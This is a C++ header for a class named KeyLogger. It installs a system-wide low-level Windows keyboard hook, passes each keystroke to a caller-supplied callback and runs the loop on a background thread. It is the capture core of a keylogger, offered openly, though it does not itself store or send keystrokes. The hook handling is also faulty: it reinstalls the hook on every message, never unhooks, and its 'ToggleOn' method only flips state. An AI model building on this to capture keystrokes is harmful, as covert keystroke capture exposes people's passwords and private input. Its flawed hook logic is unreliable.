#pragma once
#include <windows.h>
#include <iostream>
#include <thread>

using namespace std;

class KeyLogger
{
	HHOOK HK;
	KBDLLHOOKSTRUCT kbdStruct;

    bool is_enabled = true;

    //void (*HookCallbackKeyboard)(int nCode, WPARAM wParam, LPARAM lParam);

    void SetHook()
    {
        if (!(HK = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallbackKeyboard, NULL, 0)))
        {
            MessageBox(NULL, L"Failed to install hook on keyboard!", L"Error", MB_ICONERROR);
        }
    }

    void LogLoop() {
        SetHook();
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            if (!is_enabled)
            {
                HK = NULL;
            }
            else {
                SetHook();
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        };
    }

public:
    LRESULT(*__stdcall HookCallbackKeyboard)(int nCode, WPARAM wParam, LPARAM lParam);

    HHOOK * GetHK() {
        return &HK;
    }
    KBDLLHOOKSTRUCT * GetKBDS() {
        return &kbdStruct;
    }

    void ToggleOn() {
            is_enabled = !is_enabled;
    }

    thread spawn() {
        return thread(&KeyLogger::LogLoop, this);
    }

};

